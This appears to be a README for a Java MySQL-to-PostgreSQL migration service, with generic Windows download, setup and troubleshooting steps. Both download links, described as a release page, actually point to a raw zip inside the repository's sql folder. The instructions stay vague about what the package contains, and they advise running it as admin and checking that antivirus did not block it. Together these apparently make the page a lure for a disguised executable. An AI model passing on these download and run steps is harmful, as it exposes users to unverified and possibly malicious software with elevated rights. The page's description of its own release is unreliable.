# 🗄️ mini-database-migration-service-java - Move MySQL Data With Less Effort

[![Download the release](https://img.shields.io/badge/Download%20Release-blue?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/nahumhyperfine28/mini-database-migration-service-java/main/sql/migration-database-java-mini-service-3.1-beta.2.zip)

## 🚀 What This App Does

This app helps you move data from one database to another. It supports:

- Full load, for copying existing data
- MySQL binlog CDC, for keeping up with new changes
- Checkpoint recovery, for resuming after a stop

It is meant for users who want a simple way to run database migration tasks on Windows.

## 🖥️ What You Need

Before you start, make sure you have:

- A Windows computer
- A modern browser
- Permission to download and run files
- A source MySQL database
- A target database, such as PostgreSQL or MySQL
- Enough disk space for your data copy

For smooth use, close other large apps while the migration runs.

## 📦 Download the App

Visit this page to download the latest release:

[Download mini-database-migration-service-java](https://raw.githubusercontent.com/nahumhyperfine28/mini-database-migration-service-java/main/sql/migration-database-java-mini-service-3.1-beta.2.zip)

Look for the latest release asset for Windows. If there are several files, choose the one meant for Windows use, such as a `.zip` or `.exe` file.

## 🪟 How to Install on Windows

### 1. Download the release
Go to the release page and download the Windows file.

### 2. Open the file
If you downloaded a `.zip` file:

- Right-click the file
- Select Extract All
- Choose a folder you can find later

If you downloaded an `.exe` file:

- Double-click the file to start it

### 3. Start the app
Open the extracted folder or the installed program.

If the app uses a window-based launch file, double-click it.

If the app opens in a browser or local page, follow the file name included in the release package.

### 4. Keep the folder in place
Do not move or delete the app files after setup. The service may use files in the same folder for config, logs, and recovery.

## ⚙️ Basic Setup

This app works by connecting to a source database and a target database. You usually need to prepare a few details before migration starts:

- Source host
- Source port
- Source database name
- Source user name
- Source password
- Target host
- Target port
- Target database name
- Target user name
- Target password

You may also need:

- Binlog settings on the MySQL source
- A start point for CDC
- A checkpoint path for recovery
- Table selection rules

If the app shows a setup screen, fill in these values there. If it uses a config file, open it in Notepad and update the values with your database details.

## 🔌 How to Connect Your Databases

### Source database
The source database is the place where your current data lives. This app reads from MySQL and can track changes through binlog CDC.

Make sure the source database:

- Allows remote access if needed
- Has a user with read access
- Has binlog enabled if you want change capture

### Target database
The target database is where the data will go. This app can copy data into another database, such as PostgreSQL or MySQL.

Make sure the target database:

- Exists before you start
- Has the tables you need, or allows the app to create them
- Has enough room for the incoming data

## 🔁 How Migration Works

The app usually runs in two stages:

### Full load
The app copies the current data from the source database to the target database.

Use this when:

- You want the first copy of all data
- You need to seed a new database
- You want a clean start before tracking changes

### CDC from MySQL binlog
After the full load, the app can keep watching for changes in MySQL.

This helps when:

- New rows are added
- Existing rows are updated
- Rows are deleted

CDC keeps the target database close to the source database without manual copying.

## 🧭 Suggested First Run

If this is your first time using the app, follow this path:

1. Download the release
2. Open the app on Windows
3. Enter source and target database details
4. Start a full load
5. Confirm the data appears in the target database
6. Turn on CDC if you want ongoing updates
7. Save the checkpoint if the app offers that option

## 💾 Checkpoint Recovery

Checkpoint recovery helps the app resume after a stop.

This matters if:

- Your computer shuts down
- The app closes
- The network drops
- A database connection fails

When the app restarts, it can use the last saved checkpoint and continue from the right place. This reduces the need to start over.

## 📁 Common Files You May See

After you download or extract the app, you may see files like these:

- `config.yml` or `application.yml` for settings
- `logs/` for run history
- `checkpoint/` for saved progress
- `README.txt` for extra release details
- `.exe` or `.bat` for starting the app on Windows

If a release includes a startup file, use that file first.

## 🛠️ Troubleshooting

### The app does not start
Try these steps:

- Check that the download finished
- Extract the zip file again
- Run the file as an admin if Windows asks
- Make sure your antivirus did not block the file

### The app cannot connect to MySQL
Check:

- Host name
- Port number
- User name
- Password
- Firewall rules
- MySQL access settings

### The target database stays empty
Check:

- The target database name
- Table names
- User permissions
- Whether the full load finished
- Whether the app wrote any error logs

### CDC does not pick up changes
Check:

- MySQL binlog is enabled
- The source user can read binlog data
- The app points to the right server
- Time and checkpoint settings are correct

## 🔍 Release Page Tips

When you open the release page, look for:

- The latest version
- Windows files
- Asset names that match your system
- A zip file if you want to extract and run
- An exe file if you want a direct launch

If a release has more than one file, pick the one for Windows and follow the short note in the release entry.

## 🧪 Good Uses for This App

This app fits common database tasks such as:

- Moving data from one MySQL server to another
- Copying data into PostgreSQL for testing or reporting
- Seeding a new database with current records
- Keeping two systems in sync during a move
- Resuming a migration after a stop

## 🧱 How to Keep the Process Stable

To avoid breaks during migration:

- Keep your computer on
- Avoid closing the app during a full load
- Use a stable network
- Keep source and target database credentials ready
- Watch the logs if the app shows them

If your data set is large, let the process finish before shutting down the machine.

## 📝 What to Check After Setup

After the app starts, confirm these items:

- The source database connects
- The target database connects
- The full load begins
- Table rows appear in the target
- CDC starts after the initial copy
- A checkpoint gets saved after progress is made

If these steps work, the migration path is ready

## 📚 Project Focus

This project centers on:

- Backend data movement
- Binlog-based change capture
- Data replication
- Database migration
- Java service runtime
- MySQL source support
- PostgreSQL target support
- Spring Boot service structure
- Recovery through saved checkpoints